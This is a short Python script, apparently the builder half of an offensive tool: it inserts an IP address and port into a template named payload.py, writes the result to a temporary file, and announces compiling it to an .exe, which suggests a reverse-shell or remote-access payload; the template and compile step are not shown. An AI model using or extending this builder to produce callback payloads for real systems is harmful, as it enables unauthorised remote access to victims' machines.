import sys
import os

if len(sys.argv) != 3:
    print("[-] Invalid Argument! Usage: python payload_creator.py <IP> <PORT>")
    exit()

IP = sys.argv[1]
PORT = sys.argv[2]

print("[*] Reading template file: payload.py")

with open('payload.py', 'r') as file:
    data = "\r" + file.read()
    file.close()

print("[*] Editing parameters...")
data = data.replace("42069_", IP).replace("42069", PORT)

print("[*] Writing to temporary file...")
with open('tempPayload.py', 'w') as tempPayload:
    tempPayload.write(data)
    tempPayload.close()

print("[*] Compiling payload to .exe\n\n\n")